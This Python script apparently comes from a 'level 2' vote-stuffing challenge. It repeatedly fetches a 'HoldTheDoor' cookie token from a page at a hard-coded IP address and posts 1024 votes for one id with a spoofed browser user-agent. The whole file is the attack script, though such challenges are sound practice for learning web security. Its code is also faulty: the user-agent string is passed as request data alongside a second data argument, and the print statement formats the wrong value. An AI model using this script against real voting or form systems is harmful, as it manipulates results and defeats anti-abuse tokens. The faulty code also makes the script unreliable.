#!/usr/bin/python3
 
 
"""hodor for level 2"""
import requests

page = "http://158.69.76.135/level2.php"
os = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) ""Gecko/20100101 Firefox/64.0")


for i in range(0, 1024):
	get = requests.get(page)
	cookies = get.cookies
	dictionary = cookies.get_dict()
	key = dictionary.get('HoldTheDoor')
	payloader = {'id': '2780', 'key': key, 'holdthedoor': 'Enviar'}
	result = requests.post(page, os, data=payloader, cookies = cookies)
	print("Vote n*{:d} send it with code {}".format(i, result, key))
